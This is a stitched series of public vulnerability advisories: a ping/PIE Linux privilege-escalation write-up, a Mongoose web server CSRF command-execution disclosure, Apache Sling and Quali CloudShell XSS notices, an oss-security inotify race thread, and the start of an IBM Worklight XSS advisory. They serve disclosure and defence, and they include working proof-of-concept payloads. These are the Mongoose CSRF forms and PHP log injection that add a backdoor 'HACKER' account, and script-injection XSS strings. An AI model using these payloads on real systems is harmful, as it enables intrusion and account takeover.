shown in our Stack Clash advisory, if we pass 1.5GB of argument strings
to execve(), then any PIE may be mapped directly below the stack (and
trigger CVE-2017-1000253) with a probability of ~1/17331 (5 hours on
average, if each run takes 1 second).
------------------------------------------------------------------------
Post-Stack-Clash kernels
------------------------------------------------------------------------
As a proof-of-concept, we will publish CVE-2017-1000253.c, an exploit
for ping on CentOS-7 kernel versions ""3.10.0-514.21.2.el7.x86_64"" and
""3.10.0-514.26.1.el7.x86_64"" (the first kernel updates after the Stack
Clash). The PIE/stack layout on these post-Stack-Clash kernels differs
slightly from the layout on pre-Stack-Clash kernels, since the size of
the stack guard-page was increased from 4KB to 1MB:
Linux localhost.localdomain 3.10.0-514.26.1.el7.x86_64 #1 SMP Thu Jun 29 16:05:25 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
7ffba9ee4000-7ffbaa09b000 r-xp 00000000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbaa09b000-7ffbaa29a000 ---p 001b7000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbaa29a000-7ffbaa29e000 r--p 001b6000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbaa29e000-7ffbaa2a0000 rw-p 001ba000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbaa2a0000-7ffbaa2a5000 rw-p 00000000 00:00 0
7ffbaa2a5000-7ffbaa2c5000 r-xp 00000000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbaa499000-7ffbaa4bd000 rw-p 00000000 00:00 0
7ffbaa4c2000-7ffbaa4c3000 rw-p 00000000 00:00 0
7ffbaa4c3000-7ffbaa4c5000 r-xp 00000000 00:00 0 [vdso]
7ffbaa4c5000-7ffbaa4c6000 r--p 00020000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbaa4c6000-7ffbaa4c7000 rw-p 00021000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbaa4c7000-7ffbaa4c8000 rw-p 00000000 00:00 0
7ffbaa4c8000-7ffbaa4ca000 r-xp 00000000 fd:00 4194375 /tmp/PIE
7ffbaa5ca000-7ffbaa6c9000 rw-p 00000000 00:00 0
7ffbaa6c9000-7ffbaa6ca000 r--p 00001000 fd:00 4194375 /tmp/PIE
7ffbaa6ca000-7ffbaa6eb000 rw-p 00002000 fd:00 4194375 /tmp/PIE
7ffbaa7eb000-7ffc0a6eb000 rw-p 00000000 00:00 0 [heap]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
rsp 0x7ffbaa6d1c18
In this example, the kernel's execve() code also mapped the PIE's
read-write segment into the stack memory region, and divided the stack
into three parts, but:
- 7ffbaa5ca000-7ffbaa6c9000, the lowest part of the stack, is not
displayed as the ""[stack]"" in /proc/pid/maps (because rsp does not
point there), but is correctly flagged as a stack in /proc/pid/smaps;
- 7ffbaa6c9000-7ffbaa6eb000, the middle part of the stack, was replaced
by the PIE's read-write segment, and is where rsp points to, after
execve() returns to the userland;
- 7ffbaa7eb000-7ffc0a6eb000, the highest part of the stack, is (again)
incorrectly displayed as the ""[heap]"" in /proc/pid/maps, but is
correctly flagged as a stack in /proc/pid/smaps.
Older kernels (such as ""3.10.0-514.21.1.el7.x86_64"") and newer kernels
(such as ""3.10.0-514.26.2.el7.x86_64""), other distributions and other
privileged PIEs (including SUID-root PIEs), are also exploitable, but
the exploitation method must be adapted to slightly different PIE/stack
layouts. This is left as an exercise for the interested reader.
========================================================================
Exploitation
========================================================================
Our CVE-2017-1000253.c exploit for CentOS-7 kernel versions
""3.10.0-514.21.2.el7.x86_64"" and ""3.10.0-514.26.1.el7.x86_64"" is very
similar to our stack-clash exploit Linux_ldso_dynamic.c (we smash the
PIE's .dynamic section with a stack-based string operation, and force
ld.so to load and execute our own shared library), but with two
important differences:
- we do not need to jump over the stack guard-page, because rsp
naturally points into the PIE's read-write segment after we trigger
CVE-2017-1000253;
- on 64-bit, all .dynamic tags contain null-bytes, a serious problem if
we want to smash the .dynamic section with a null-terminated string.
To solve this problem, we smash the .dynamic section with multiple calls
to process_dl_debug(), a function called by process_envvars() very early
in dl_main(), before elf_get_dynamic_info() parses the .dynamic section.
process_dl_debug() is called for each LD_DEBUG environment variable, and
calls strndupa() (strnlen(), alloca(), memcpy()) for each unknown option
in LD_DEBUG, thus allowing us to smash the .dynamic section with
multiple null-terminated strings, and hence multiple null-bytes.
Unfortunately, the .dynamic entries that we build on the stack with
process_dl_debug():
- DT_SYMTAB (tag 0x0000000000000006, value unused);
- DT_STRTAB (tag 0x0000000000000005), an offset (into the PIE's
read-execute segment) to our own .dynstr section -- this is later
transformed by elf_get_dynamic_info() into an absolute address,
allowing us to bypass ASLR;
- DT_NEEDED (tag 0x0000000000000001), an offset (into our .dynstr
section) to the pathname of our own shared library -- we use offset
0x238+1 into the PIE's read-execute segment, where the string
""lib64/ld-linux-x86-64.so.2"" is always stored;
- DT_NULL (tag 0x0000000000000000, value unused);
are partially destroyed by the stack-frames of further function calls
(_dl_error_printf(), for example). Our solution to this problem is very
specific to CentOS 7, and restricts this particular exploit to the PIEs
whose .dynamic section's address modulo 16 is equal to 8:
- we build our .dynamic tags through a stack variable used by memcpy()
to store the address modulo 16 of the unknown options in LD_DEBUG;
- we store our .dynamic values in an unused slot of process_dl_debug()'s
stack-frame.
One last, unexpected problem with this particular exploit is that rsp
can never point into the highest part of the stack (after the kernel's
execve() code divided the stack into three parts): indeed, the kernel's
page-fault handler would then try to insert a stack guard-page below the
highest part of the stack, and would SIGKILL our process because the
PIE's read-write segment is already mapped there.
The solution to this problem is simple, but further restricts this
particular exploit to the PIEs whose read-write segment is large enough
to encompass rsp: the kernel's page-fault handler will not try to insert
a stack guard-page there, because the PIE's read-write segment is not
flagged as a stack (VM_GROWSDOWN). For example, on a default, minimal
CentOS 7, ping is privileged (cap_net_admin and cap_net_raw) and
exploitable:
[user@localhost tmp]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
...
[user@localhost tmp]$ readelf -a /usr/bin/ping
...
Type Offset VirtAddr PhysAddr
FileSiz MemSiz Flags Align
...
LOAD 0x000000000000da58 0x000000000020da58 0x000000000020da58
0x0000000000000988 0x00000000000241e8 RW 200000
DYNAMIC 0x000000000000da78 0x000000000020da78 0x000000000020da78
0x0000000000000240 0x0000000000000240 RW 8
...
[user@localhost tmp]$ ./CVE-2017-1000253 /usr/bin/ping
argv_size 101903
smash_size 36864
hi_smash_size 18432
lo_smash_size 18432
probability 1/16028
try 1 1.409649 exited 2
try 2 1.097508 exited 2
try 3 1.060084 exited 2
try 4 1.059042 exited 2
try 5 1.090841 exited 2
try 6 1.068993 exited 2
try 7 1.093662 exited 2
...
try 3411 1.018799 exited 2
try 3412 1.022255 exited 2
try 3413 1.022062 exited 2
try 3414 1.061316 exited 2
try 3415 1.024066 exited 2
try 3416 1.024864 exited 2
try 3417 1.043867 exited 2
Pid: 6301
Uid: 1000 1000 1000
Gid: 1000 1000 1000
CapInh: 0000000000000000
CapPrm: 0000000000003000
CapEff: 0000000000000000
[root@localhost tmp]# cat /proc/6301/status
Name: ping
...
Pid: 6301
...
Uid: 1000 1000 1000 1000
Gid: 1000 1000 1000 1000
...
CapInh: 0000000000000000
CapPrm: 0000000000003000
CapEff: 0000000000000000
...
[root@localhost tmp]# cat /proc/6301/maps
7ffbc573d000-7ffbc58f4000 r-xp 00000000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbc58f4000-7ffbc5af3000 ---p 001b7000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbc5af3000-7ffbc5af7000 r--p 001b6000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbc5af7000-7ffbc5af9000 rw-p 001ba000 fd:00 9066 /usr/lib64/libc-2.17.so
7ffbc5af9000-7ffbc5afe000 rw-p 00000000 00:00 0
7ffbc5afe000-7ffbc5aff000 r-xp 00000000 fd:00 4303255 /tmp/lib64/ld-linux-x86-64.so.2
7ffbc5aff000-7ffbc5cfe000 ---p 00001000 fd:00 4303255 /tmp/lib64/ld-linux-x86-64.so.2
7ffbc5cfe000-7ffbc5cff000 r--p 00000000 fd:00 4303255 /tmp/lib64/ld-linux-x86-64.so.2
7ffbc5cff000-7ffbc5d00000 rw-p 00001000 fd:00 4303255 /tmp/lib64/ld-linux-x86-64.so.2
7ffbc5d00000-7ffbc5d20000 r-xp 00000000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbc5f15000-7ffbc5f18000 rw-p 00000000 00:00 0
7ffbc5f1c000-7ffbc5f1e000 rw-p 00000000 00:00 0
7ffbc5f1e000-7ffbc5f20000 r-xp 00000000 00:00 0 [vdso]
7ffbc5f20000-7ffbc5f21000 r--p 00020000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbc5f21000-7ffbc5f22000 rw-p 00021000 fd:00 1229 /usr/lib64/ld-2.17.so
7ffbc5f22000-7ffbc5f23000 rw-p 00000000 00:00 0
7ffbc5f23000-7ffbc5f31000 r-xp 00000000 fd:00 12968754 /usr/bin/ping
7ffbc6031000-7ffbc6130000 rw-p 00000000 00:00 0
7ffbc6130000-7ffbc6131000 r--p 0000d000 fd:00 12968754 /usr/bin/ping
7ffbc6131000-7ffbc6132000 rw-p 0000e000 fd:00 12968754 /usr/bin/ping
7ffbc6132000-7ffbc6155000 rw-p 00000000 00:00 0 [stack]
7ffbc6255000-7ffc29988000 rw-p 00000000 00:00 0 [heap]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
[root@localhost tmp]# gdb /usr/bin/ping 6301
...
(gdb) x/16384xg 0x7ffbc6130000 + 8
0x7ffbc6130008: 0x4141414141414141 0x4141414141414141
0x7ffbc6130018: 0x4141414141414141 0x4141414141414141
0x7ffbc6130028: 0x4141414141414141 0x4141414141414141
0x7ffbc6130038: 0x4141414141414141 0x4141414141414141
0x7ffbc6130048: 0x4141414141414141 0x4141414141414141
0x7ffbc6130058: 0x4141414141414141 0x4141414141414141
0x7ffbc6130068: 0x4141414141414141 0x4141414141414141
...
0x7ffbc6132678: 0x4141414141414141 0x4141414141414141
0x7ffbc6132688: 0x4141414141414141 0x4141414141414141
0x7ffbc6132698: 0x4141414141414141 0x4141414141414141
0x7ffbc61326a8: 0x4141414141414141 0x4141414141414141
0x7ffbc61326b8: 0x4141414141414141 0x4141414141414141
0x7ffbc61326c8: 0x4141414141414141 0x4141414141414141
0x7ffbc61326d8: 0x4141414141414141 0x00007ffbc6132700
0x7ffbc61326e8: 0x00007ffbc5d01463 0x4141414141410041
0x7ffbc61326f8: 0x0000000000000005 0x888908844e7ab888
0x7ffbc6132708: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc6132718: 0x4141414141414141 0x4141414141414141
0x7ffbc6132728: 0x0041414141414141 0x00007ffbc6132740
0x7ffbc6132738: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc6132748: 0x4141414141414141 0x4141414141414141
0x7ffbc6132758: 0x4141414141414141 0x4141414141414141
0x7ffbc6132768: 0x4141414141414141 0x4141414141414141
0x7ffbc6132778: 0x4141414141414141 0x4141414141414141
0x7ffbc6132788: 0x4141414141414141 0x00007ffbc6132700
0x7ffbc6132798: 0x00007ffbc5d01463 0x4141414141410041
0x7ffbc61327a8: 0x0000000000000001 0x77777777777779b1
0x7ffbc61327b8: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc61327c8: 0x4141414141414141 0x4141414141414141
0x7ffbc61327d8: 0x0041414141414141 0x00007ffbc61327f0
0x7ffbc61327e8: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc61327f8: 0x4141414141414141 0x4141414141414141
0x7ffbc6132808: 0x4141414141414141 0x4141414141414141
0x7ffbc6132818: 0x4141414141414141 0x4141414141414141
0x7ffbc6132828: 0x4141414141414141 0x4141414141414141
0x7ffbc6132838: 0x4141414141414141 0x00007ffbc6132800
0x7ffbc6132848: 0x00007ffbc5d01463 0x4141414141410041
0x7ffbc6132858: 0x0000000000000006 0x4848c8440e3a7848
0x7ffbc6132868: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc6132878: 0x4141414141414141 0x4141414141414141
0x7ffbc6132888: 0x0000000000000000 0x00007ffbc61328a0
0x7ffbc6132898: 0x00007ffbc5d01463 0x4141414141414141
0x7ffbc61328a8: 0x4141414141414141 0x4141414141414141
0x7ffbc61328b8: 0x4141414141414141 0x4141414141414141
0x7ffbc61328c8: 0x4141414141414141 0x4141414141414141
0x7ffbc61328d8: 0x4141414141414141 0x4141414141414141
0x7ffbc61328e8: 0x4141414141414141 0x4141414141414141
0x7ffbc61328f8: 0x4141414141414141 0x4141414141414141
...
(gdb) x/s 0x888908844e7ab888 + 0x77777777777779b1
0x7ffbc5f23239: ""lib64/ld-linux-x86-64.so.2""
========================================================================
Acknowledgments
========================================================================
We thank Red Hat and the members of the linux-distros@openwall list."
1642,CVE-2017-11567 Mongoose Web Server v6.5 CSRF Command Execution ( apparitionsec @ gmail / hyp3rlinx ),,CVE-2017-11567,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MONGOOSE-WEB-SERVER-v6.5-CSRF-COMMAND-EXECUTION.txt
[+] ISR: apparitionSec
Vendor:
===============
www.cesanta.com
Product:
==================
Mongoose Web Server (Free Edition)
Mongoose-free-6.5.exe
Download: https://cesanta.com/binary.html
Mongoose - GitHub's most popular embedded web server
and multi-protocol networking library
Mongoose Embedded Web Server Library - Mongoose is more than an embedded webserver. It is a multi-protocol embedded networking library
with functions including TCP, HTTP client and server, WebSocket client and server, MQTT client and broker and much more.
Vulnerability Type:
===================
CSRF - Command Execution
CVE Reference:
==============
CVE-2017-11567
Security Issue:
================
Remote attackers who can lure a Mongoose web server user into clicking a malicious link or visit attacker controlled web page
can execute system commands on the system hosting Mongoose server. However, IF Mongoose web server is installed as service then
executing programs e.g. ""calc.exe"" may at times crash or fail to appear, but you may see it in Windows taskmgr.exe.
Therefore, from my tests commands may become unstable when Mongoose is run as a service.
When Mongoose is run standard mode attackers can potentially modify ""Mongoose.conf"" and create arbitrary files on server like .PHP etc.
to point Mongoose to this as its new ""index"" file. Then you need to tell Mongoose its ""access_log_file"" is the new attacker generated
file, after injecting commands into Mongoose web servers log file that will get excuted when log file is later requested.
This vulnerability requires CGI interpreter to be already set or some information about the target is known like the CGI path and language
""pl,php,cgi"" used, so when we can set to use correct programming language when file is created during initial CRSF attack.
Note: If running commands with arguments, we have to use "" "" tab chars as using space will break our TELNET based code injection
to the server log.
e.g.
GET<?php exec(""cmd.exe /c net user HACKER abc123 /add"");?> HTTP/1.1
OR just TELNET to Mongoose web server, inject arbitrary commands, then call exec by making another TELNET HTTP GET.
After Command Injection ""Mongoose.conf"" will be:
# Mongoose web server configuration file.
# For detailed description of every option, visit
# https://github.com/cesanta/Mongoose
# Lines starting with '#' and empty lines are ignored.
# To make a change, remove leading '#', modify option's value,
# save this file and then restart Mongoose.
# access_control_list
access_log_file C:Mongoose.access.php <======= BOOM
# auth_domain mydomain.com
cgi_interpreter c:xamppphpphp.exe <====== MUST BE SET
# cgi_pattern **.cgi$|**.pl$|**.php$
# dav_auth_file
# dav_root
# debug 0
document_root C:
# enable_directory_listing yes
# error_log_file
# extra_headers
# extra_mime_types
# global_auth_file
# hide_files_patterns
# hexdump_file
index_files Mongoose.access.php <======== BOOM
# listening_port 8080
# run_as_user
# ssi_pattern **.shtml$|**.shtm$
# ssl_certificate
# ssl_ca_certificate
# start_browser yes
# url_rewrites
Mongoose log file Command Inject to create backdoor.
-----------------------------------------------------------
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
2017-07-24 03:12:30 - 127.0.0.1 - GET<?php exec(""cmd.exe /c net user HACKER abc123 /add"");?> 400 0 -
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_settings 200 4294967295 http://127.0.0.1:8080/__mg_admin
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_cfg_file_status 200 4294967295 http://127.0.0.1:8080/__mg_admin
2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /favicon.ico 404 0 -
Tested Windows 7.
Exploit/POC:
=============
1) add backdoor account POC.
<form action=""http://127.0.0.1:8080/__mg_admin?save"" method=""post"">
<input type=""hidden"" name=""access_log_file"" value=""Mongoose.access.php"">
<input type=""hidden"" name=""cgi_pattern"" value=""**.cgi$|**.pl$|**.php"">
<input type=""hidden"" name=""index_files"" value=""Mongoose.access.php"">
<input type=""hidden"" name=""cgi_interpreter"" value=""c:xamppphpphp.exe"">
<script>document.forms[0].submit()</script>
</form>
2) TELNET x.x.x.x 8080
GET<?php exec(""cmd.exe /c net user HACKER abc123 /add"");?> HTTP/1.1
Enter
Enter
TELNET x.x.x.x 8080
GET / HTTP/1.1
Enter
Enter
Done, backdoor added!
====================
1) run calc.exe POC.
<form action=""http://127.0.0.1:8080/__mg_admin?save"" method=""post"">
<input type=""hidden"" name=""cgi_pattern"" value=""**.cgi$|**.pl$|**.exe"">
<input type=""hidden"" name=""index_files"" value=""../../../../../../Windows/system32/calc.exe"">
<input type=""hidden"" name=""cgi_interpreter"" value=""../../../../../../Windows/system32/calc.exe"">
<script>document.forms[0].submit()</script>
</form>
2) TELNET x.x.x.x 8080
GET / HTTP/1.1
Enter
Enter
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
=================================
Vendor Notification: July 23, 2017
Vendor Notification: July 28, 2017
Vendor Acknowledgement: July 31, 2017
Vendor Fixed released version 6.9 : September 4, 2017
September 4, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1666,CVE-2017-9802: Apache Sling XSS vulnerability,,CVE-2017-9802,"CVE-2017-9802: Apache Sling XSS vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Sling Servlets Post 2.3.20
Description:
The Javascript method Sling.evalString() uses the javascript `eval`
function to parse input strings, which allows for XSS attacks by
passing specially crafted input strings.
Mitigation:
Users should upgrade to version 2.3.22 or later of the Sling Servlets
Post bundle.
Credit: This issue was discovered and reported by Dmitriev V.
Daniil Dmitriev V. Daniil <sgoesw gmail com>.
References:
- https://issues.apache.org/jira/browse/SLING-7041
- https://sling.apache.org/project-information/security.html
Robert Munteanu"
1667,[CVE-2017-9767] Quali CloudShell (v7.1.0.6508 Patch 6) Multiple Stored Cross Site Scripting Vulnerability,,CVE-2017-9767,"# Vulnerability type: Multiple Stored Cross Site Scripting
# Vendor: Quali
# Product: CloudShell
# Affected version: v7.1.0.6508 (Patch 6)
# Patched version: v8 and up
# Credit: Benjamin Lee
# CVE ID: CVE-2017-9767
==========================================================
# Overview
Quali CloudShell (v7.1.0.6508 Patch 6) is vulnerable to multiple stored XSS vulnerabilities on its platform this can be exploited to execute arbitrary HTML and script code on all users (including administrators) from a low-privileged account.
==========================================================
# Vulnerable URL 1 (Reservation Function)
/RM/Reservation/ReserveNew
# Vulnerable parameter(s)
- Name
- Description
# Sample payload
'""><script>alert(""xss"")</script>
# PROOF OF CONCEPT
- Go to the ""Inventory"" tab
- Click on details button on either of the items
- Click on the reserve button and enter the XSS payload onto the affected parameters
- Add users to the permitted user list (e.g. admin accounts)
- Once the user click on the reservation list details, the XSS would be executed
==========================================================
# Vulnerable URL 2 (Environment Function)
/RM/Topology/Update
# Vulnerable parameter(s)
- Description
# Sample payload
'""><script>alert(""xss"")</script>
# PROOF OF CONCEPT
- Go to the ""Environment"" tab
- Click on item properties button
- Enter the XSS payload onto the affected parameters
- Change the owner to another user (e.g. admin accounts)
- Once the user click on the more info button of the item in the environment tab, the XSS would be executed
==========================================================
# Vulnerable URL 3 (Job Scheduling Function)
/SnQ/JobTemplate/Edit?jobTemplateId=<job template id>
# Vulnerable parameter(s)
- Name
- Description
- ExecutionBatches[0].Name
- ExecutionBatches[0].Description
- Labels
# Sample payload
'""><script>alert(""xss"")</script>
# PROOF OF CONCEPT
- Go to the ""Job Scheduling > Add New Suite"" tab
- Enter the XSS payload onto the affected parameters
- Once the user view details of this suite, the XSS would be executed
==========================================================
# Vulnerable URL 4 (Resource Template Function)
/RM/AbstractTemplate/AddOrUpdateAbstractTemplate
# Vulnerable parameter(s)
- Alias
- Description
# Sample payload
'""><script>alert(""xss"")</script>
# PROOF OF CONCEPT
- Go to the ""Inventory > abstract template > Add New"" tab
- Enter the XSS payload onto the affected parameters
- Once the user click on the more info button of the item, the XSS would be executed
==========================================================
# Timeline
- 06/06/2017: Vulnerability found
- 20/06/2017: Vendor informed
- 20/06/2017: Vendor responded and acknowledged
- 16/07/2017: Vendor fixed the issue
- 12/08/2017: Vendor agreed on public disclosure
- 14/08/2017: Public disclosure"
1682,Re: [oss-security] [CVE-2017-7533] kernel: inotify: a race between inotify_handle_event() and sys_rename(),,CVE-2017-7533,"This bothers me, and since nobody else has bothered to ask, I'll chime in:
Can someone please clear up this timeline for me?
We have:
(nearly a month ago) 7/7/2017 Silent upstream fix for vulnerability, no
stable cc, no backports performed, no distro fixes.
Possibly before this, possibly after (please clarify) there is some
academic research regarding the vulnerability. Did these researchers
report the vulnerability to security kernel org?
Possibly before this, possibly after (please clarify) there is an exploit
""in the wild"" but which I have not been able to find publicly easily.
Does ""in the wild"" here mean it's being actively exploited? When was the
existence of this exploit first known? Who discovered it?
Was this vulnerability embargoed? Did the researchers request a one month
embargo? For what reason? Why are we hearing about a vulnerability
with an exploit ""in the wild"" a month after it was public knowledge to
attackers?
Thanks,
-Brad
On Thu, Aug 03, 2017 at 10:00:02AM -0400, Vladis Dronov wrote:
> Hello,
>
> A race condition was found in Linux kernel present since v3.14-rc1 upto v4.12
> including. The race happens between threads of inotify_handle_event() and
> vfs_rename() while running the rename operation against the same file. The next
> slab data or the slab's free list pointer can be corrupted with attacker-controlled
> data as a result of the race.
>
> The researchers of this flaw are Fan Wu and Shixiong Zhao from a research group
> supervised by Dr. Heming Cui of the Department of Computer Science, The University
> of Hong Kong. Thanks to Rui Gu and Prof. Junfeng Yang from Columbia University for
> tools and suggestions.
>
> References:
>
> https://bugzilla.redhat.com/show_bug.cgi?id=1468283
>
> https://access.redhat.com/security/vulnerabilities/3112931
>
> https://patchwork.kernel.org/patch/9755753/
>
> https://patchwork.kernel.org/patch/9755757/
>
> An upstream patch:
>
> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=49d31c2f389acfe83417083e1208422b4091cd9
>
> So as for the flaw itself.
>
> There is quite easily reached race condition between inotify_handle_event() and
> sys_rename(). A rename thread can change the dentry name before an fsnotify
> thread is copying the dentry name but after a memory for this is allocated:
>
> CPU 1 CPU 2
>
> fsnotify()
> inotify_handle_event(.., file_name)
> strlen(file_name) // file_name is ""foobar""
> alloc_len += len + 1;
> event = kmalloc(alloc_len, GFP_KERNEL); // 7 bytes for the file_name
>
> sys_rename()
> __d_move() [in fs/dcache.c]
> copy_name()
> // rename to ""foobar_lol_kek_u_pwned""
>
> strcpy(event->name, file_name);
> // now file_name points to ""foobar_lol_kek_u_pwned""
> // but there is a space only for ""foobar""
> // the next slab or slab's *freelist is corrupted with user controlled data
>
> There is a working exploit allowing privileges escalation in the wild for 32 bit
> kernels. We are unaware of such exploit for 64 bit kernels, but these are affected
> by this race too and we believe such an exploit could exist.
>
> The result of exploiting the flaw is modified data after the slab, which can be
> the next slab data, freelist pointer or something else (if the slab is the last
> one in the cache).
>
> The slab corruption caused by the exploit or the reproducer cat be easily seen
> with ""slub_debug=FZ"" kernel parameter. The following log indicates a write beyond
> the allocated slab, in this case a write to the slab's red zone:
>
> [ 144.109993] =============================================================================
> [ 144.110011] BUG kmalloc-64 (Not tainted): Redzone overwritten
> [ 144.110011] -----------------------------------------------------------------------------
> [ 144.110011] Disabling lock debugging due to kernel taint
> [ 144.110011] INFO: 0xffff8800bbb544f0-0xffff8800bbb544f7. First byte 0x33 instead of 0xcc
> [ 144.110011] INFO: Slab 0xffffea0002eed500 objects=51 used=23 fp=0xffff8800bbb54d70 flags=0x5fffff00000081
> [ 144.110011] INFO: Object 0xffff8800bbb544b0 @offset=1200 fp=0xffff8800bbb544b0
> [ 144.110011]
> [ 144.110011] Bytes b4 ffff8800bbb544a0: cc cc cc cc cc cc cc cc 00 00 00 00 00 00 00 00 ................
> [ 144.110011] Object ffff8800bbb544b0: b0 44 b5 bb 00 88 ff ff b0 44 b5 bb 00 88 ff ff .D.......D......
> [ 144.110011] Object ffff8800bbb544c0: b8 78 62 bb 00 88 ff ff 20 00 00 08 00 00 00 00 .xb..... .......
> [ 144.110011] Object ffff8800bbb544d0: 01 00 00 00 00 00 00 00 01 00 00 00 61 61 61 61 ............aaaa
> [ 144.110011] Object ffff8800bbb544e0: 33 32 31 30 33 32 31 30 33 32 31 30 33 32 31 30 3210321032103210
> [ 144.110011] Redzone ffff8800bbb544f0: 33 32 31 30 33 32 31 30 32103210
> [ 144.110011] Padding ffff8800bbb544f8: 00 00 00 00 00 00 00 00 ........
> [ 144.110011] CPU: 2 PID: 1016 Comm: inotify Tainted: G B ------------ 3.10.0-514.16.1.el7.x86_64 #1
> [ 144.110011] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.9.3-1.fc25 04/01/2014
> [ 144.110011] ffff88007d801d00 0000000070c5e4c2 ffff88013bad7c08 ffffffff816869c3
> [ 144.110011] ffff88013bad7c48 ffffffff811d9cad 0000000000000008 ffff880000000001
> [ 144.110011] ffff8800bbb544f8 ffff88007d801d00 00000000000000cc ffff8800bbb544b0
> [ 144.110011] Call Trace:
> [ 144.110011] [<ffffffff816869c3>] dump_stack+0x19/0x1b
> [ 144.110011] [<ffffffff811d9cad>] print_trailer+0x14d/0x200
> [ 144.110011] [<ffffffff811d9e9f>] check_bytes_and_report+0xcf/0x110
> [ 144.110011] [<ffffffff811dab33>] check_object+0x193/0x250
> [ 144.110011] [<ffffffff8168380f>] free_debug_processing+0xcc/0x259
> [ 144.110011] [<ffffffff81213130>] ? poll_select_copy_remaining+0x150/0x150
> [ 144.110011] [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
> [ 144.110011] [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
> [ 144.110011] [<ffffffff811dca30>] __slab_free+0x250/0x2f0
> [ 144.110011] [<ffffffff81213130>] ? poll_select_copy_remaining+0x150/0x150
> [ 144.110011] [<ffffffff8168ba60>] ? __schedule+0x3b0/0x990
> [ 144.110011] [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
> [ 144.110011] [<ffffffff811dd173>] kfree+0x103/0x140
> [ 144.110011] [<ffffffff81244f9e>] inotify_free_event+0xe/0x10
> [ 144.110011] [<ffffffff81242b30>] fsnotify_destroy_event+0x30/0x50
> [ 144.110011] [<ffffffff81245424>] inotify_read+0x224/0x3e0
> [ 144.110011] [<ffffffff810b1b20>] ? wake_up_atomic_t+0x30/0x30
> [ 144.110011] [<ffffffff811fe61e>] vfs_read+0x9e/0x170
> [ 144.110011] [<ffffffff811ff1ef>] SyS_read+0x7f/0xe0
> [ 144.110011] [<ffffffff81214954>] ? SyS_poll+0x74/0x110
> [ 144.110011] [<ffffffff81697089>] system_call_fastpath+0x16/0x1b
> [ 144.110011] FIX kmalloc-64: Restoring 0xffff8800bbb544f0-0xffff8800bbb544f7=0xcc
>
> Best regards,
> Vladis Dronov | Red Hat, Inc. | Product Security Engineer"
1689,CVE-2017-1500 - Relected XSS in IBM WorkLight OAuth Server Web Api,,CVE-2017-1500,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
&#9790; Reflected Cross-Site Scripting in IBM Worklight OAuth Server Web Api &#9789;
======== &#9790; Table of Contents &#9789; =========================================
0. Overview
1. Detailed Description
2. Proof Of Concept
3. Solution
4. Disclosure Timeline
5. Thanks & Acknowledgements
6. References
7. Credits
8. Legal Notices
======== &#9790; 0. Overview &#9789; ===============================================
Release Date:
02 August 2017
Revision:
1.0
Impact:
Cross-Site Scripting (XSS) is a code injection attack that allows
an attacker to execute malicious JavaScript code in a victim's
browser, leading to steal sensitive information's and/or user
credentials.
Severity:
Medium
CVSS Score:
5.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
CVE-ID:
CVE-2017-1500
Vendor:
IBM
Affected Products:
IBM Worklight Enterprise Edition
IBM MobileFirst Platform Foundation
Affected Versions:
6.1, 6.2, 6.3, 7.0, 7.1, 8.0
Product Description:
Worklight/MobileFirst is IBM's premier mobile application platform.
On the device client app side, WorkLight/MobileFirst provide a
framework to wrap around HTML5 web pages and make them into native
applications.
This approach is popularized by PhoneGap, and is widely used by
developers (such as the GMail team at Google) to create cross
platform mobile applications.
With this approach, most of the user interface is presented in HTML5
web pages, and the native framework provides access to device native
functionalities (e.g., camera and GPS) in the form of JavaScript
functions that can be called within the HTML5 web pages.
On the server side, WorkLight/MobileFirst provides device management
capabilities including a dashboard to view versions of the
application installed on different devices.
It can also manage sending PUSH notification to the devices.
WorkLight/MobileFirst provides developer tools to create
applications using their frameworks.
